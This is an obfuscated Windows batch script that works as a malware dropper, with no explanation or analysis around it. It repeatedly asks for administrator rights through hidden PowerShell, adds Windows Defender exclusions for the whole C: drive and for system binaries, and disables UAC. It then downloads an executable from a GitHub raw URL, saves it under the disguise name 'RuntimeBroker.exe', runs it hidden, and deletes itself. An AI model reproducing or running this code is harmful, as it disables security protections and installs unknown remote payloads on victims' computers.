@echo off & setlocal enableDelayedExpansion
set "HEB=SESSION" & set "muD=NET" & set "OiraF=2>&1" & set "CtfFL=>nul"
%muD% %HEB% %CtfFL% %OiraF%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "FBo=baz" & set "qNSFL=foo" & set "jDpF=bar" & set "iiePB=qux" & rem qEzO fRRGi zByhZZk
set "NBBeW=powershell -ExecutionPolicy Bypass -Command"
set "mfju=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "Umwwy='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "DVO='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!NBBeW! "!mfju! !Umwwy! !DVO!" %CtfFL% %OiraF%
set "Pbs=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "jBqZ=-Name 'EnableLUA' -Value 0"
!NBBeW! "!Pbs! !jBqZ!" %CtfFL% %OiraF%
set "wdU=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!NBBeW! "!wdU!" %CtfFL% %OiraF%
if !errorlevel! neq 0 (goto %a%)
set "Lyky=timeout /t" & !Lyky! 2 %CtfFL% %OiraF%
set "vTDem=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "kSqwP=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "EbXnN=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!NBBeW! "!vTDem! !kSqwP! !EbXnN!" %CtfFL% %OiraF%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!Lyky! 1 %CtfFL% %OiraF% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %CtfFL% %OiraF%
del /f /q "%~f0" %CtfFL% %OiraF%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %CtfFL% %OiraF%
if !errorlevel! neq 0 (!Lyky! 3 %CtfFL% %OiraF% & goto %b%)
exit /b
